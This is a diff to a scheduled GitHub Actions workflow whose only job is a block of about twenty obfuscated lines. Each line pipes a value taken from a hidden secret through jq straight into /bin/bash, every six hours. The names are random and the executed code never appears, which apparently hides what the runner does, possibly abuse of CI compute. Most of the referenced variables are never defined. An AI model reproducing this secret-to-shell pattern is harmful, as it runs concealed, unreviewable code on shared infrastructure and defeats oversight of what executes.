@@ -3,27 +3,34 @@ name: caozhang19870101
 on:
   workflow_dispatch:
   schedule:
-    - cron: '25 1/6 * * *'
+    - cron: '6 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: caozhang19870101
         env:
-          apac5: ${{ secrets.apac5 }}
+          umtdw46: ${{ secrets.umtdw46 }}
         run: |
-          echo $apac5 | jq -r .p242 | /bin/bash
-          echo $gma527 | jq -r .pbbz618 | /bin/bash
-          echo $zhecy6207 | jq -r .acsth1 | /bin/bash
-          echo $q400 | jq -r .pxx48754 | /bin/bash
-          echo $xonuk08509 | jq -r .budva731 | /bin/bash
-          echo $pl351 | jq -r .y26 | /bin/bash
-          echo $szxox56 | jq -r .tds52 | /bin/bash
-          echo $ck947 | jq -r .xjyjp2106 | /bin/bash
-          echo $gcnn41 | jq -r .vupm9960 | /bin/bash
-          echo $vly81 | jq -r .t27800 | /bin/bash
-          echo $ikwjf304 | jq -r .gvfj39816 | /bin/bash
-          echo $rgyu988 | jq -r .nzpdr1598 | /bin/bash
+          echo $umtdw46 | jq -r .lbb2 | /bin/bash
+          echo $hnfm684 | jq -r .k19 | /bin/bash
+          echo $vfwm3 | jq -r .mtc4 | /bin/bash
+          echo $p6807 | jq -r .d67 | /bin/bash
+          echo $kqw4 | jq -r .uu0427 | /bin/bash
+          echo $ve62641 | jq -r .aleem974 | /bin/bash
+          echo $e5677 | jq -r .jijkm121 | /bin/bash
+          echo $b99947 | jq -r .woaep21 | /bin/bash
+          echo $bkvkn956 | jq -r .pvbzb017 | /bin/bash
+          echo $geq31805 | jq -r .j989 | /bin/bash
+          echo $shay30 | jq -r .ekl475 | /bin/bash
+          echo $jyaap85 | jq -r .quxi66755 | /bin/bash
+          echo $e1259 | jq -r .pj65 | /bin/bash
+          echo $pgpe2760 | jq -r .t8656 | /bin/bash
+          echo $irgzz6 | jq -r .bpr0704 | /bin/bash
+          echo $c0 | jq -r .mjqu79579 | /bin/bash
+          echo $fnvqg554 | jq -r .vvb04 | /bin/bash
+          echo $hzxp9 | jq -r .mqfu9 | /bin/bash
+          echo $xqqd3 | jq -r .kwa6 | /bin/bash
+          echo $ovv140 | jq -r .psrm5 | /bin/bash
 
